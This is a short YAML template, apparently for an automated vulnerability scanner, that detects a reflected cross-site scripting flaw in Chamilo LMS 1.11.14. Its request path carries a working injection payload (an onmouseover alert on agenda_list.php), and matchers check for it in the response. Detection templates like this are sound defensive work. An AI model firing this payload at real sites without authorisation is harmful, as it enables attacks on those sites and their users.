id: "chamilo-lms-xss"
name: "Chamilo LMS 1.11.14 Cross-Site Scripting"
severity: "high"
description: "Chamilo LMS 1.11.14 is vulnerable to cross-site scripting."
tech:
  - "php"
tags:
  - "xss"
  - "chamilo"
  - "vuln"
reference: "https://www.netsparker.com/web-applications-advisories/ns-21-001-cross-site-scripting-in-chamilo-lms/"
spaExclusion: true
request:
  method: "GET"
  path: "/main/calendar/agenda_list.php?type=xss\"+onmouseover=alert(document.domain)+\""
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "agenda_js.php?type=xss\" onmouseover=alert(document.domain)"
  - type: "status"
    status:
      - 200
  - type: "word"
    part: "header"
    words:
      - "text/html"
